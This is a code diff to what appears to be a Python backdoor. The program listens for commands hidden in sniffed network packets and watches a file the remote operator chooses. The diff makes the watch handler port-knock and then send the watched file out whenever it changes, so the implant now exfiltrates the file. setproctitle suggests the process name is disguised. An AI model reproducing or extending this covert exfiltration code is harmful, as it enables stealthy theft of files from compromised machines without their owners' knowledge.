@@ -6,11 +6,16 @@ import setproctitle
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 import os
+import utils
 
+
+observer = Observer()
 class WatchHandler(FileSystemEventHandler):
     def on_modified(self, event):
         if (event.is_directory == False) & (event.src_path == WATCH_FILE):
-            print("something happened")
+            utils.knock()
+            sleep(1)
+            utils.send_file(WATCH_FILE)
 
 def sniff_callback(packet):
     if packet.haslayer(Raw):
@@ -27,9 +32,11 @@ def sniff_callback(packet):
 
         if watch_file:
             global WATCH_FILE
+            global observer
+            observer.stop()
+            observer = Observer()
             WATCH_FILE = command
             event_handler = WatchHandler()
-            observer = Observer()
             path = os.path.split(WATCH_FILE)[0]
             observer.schedule(event_handler, path, recursive=False)
             observer.start()
